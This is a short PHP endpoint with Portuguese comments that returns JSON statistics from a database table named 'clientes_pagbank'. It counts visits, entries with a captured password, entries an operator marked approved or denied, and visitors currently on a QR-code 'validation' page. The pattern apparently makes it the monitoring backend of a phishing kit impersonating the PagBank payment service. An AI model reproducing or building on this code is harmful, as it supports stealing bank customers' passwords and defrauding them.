<?php
// --- get_stats.php ---

header('Content-Type: application/json; charset=utf-8');

// Conexão com o banco de dados
$DATABASE_URL = getenv("DATABASE_URL");
if (!$DATABASE_URL) {
    // Adapte para seu ambiente de teste local se necessário
    $DATABASE_URL = "host=SEU_HOST port=5432 dbname=SEU_DB user=SEU_USER password=SEU_PASS";
}
$db = pg_connect($DATABASE_URL);

if (!$db) {
    http_response_code(503);
    echo json_encode(["erro" => "Erro ao conectar ao banco de dados."]);
    exit;
}

// Query única e eficiente para calcular todas as estatísticas de uma vez
$query = "
    SELECT
        COUNT(*) AS total_acessos,
        COUNT(CASE WHEN senha IS NOT NULL AND senha != '' THEN 1 END) AS com_senha,
        COUNT(CASE WHEN status = 'aprovado' THEN 1 END) AS aprovados,
        COUNT(CASE WHEN status = 'negado' THEN 1 END) AS negados,
        COUNT(CASE WHEN current_page IN ('validacao.php', 'validacao-mobile.php') THEN 1 END) AS na_tela_qrcode
    FROM clientes_pagbank;
";

$result = pg_query($db, $query);
$stats = pg_fetch_assoc($result);

// Retorna os dados como um objeto JSON
echo json_encode($stats);

?>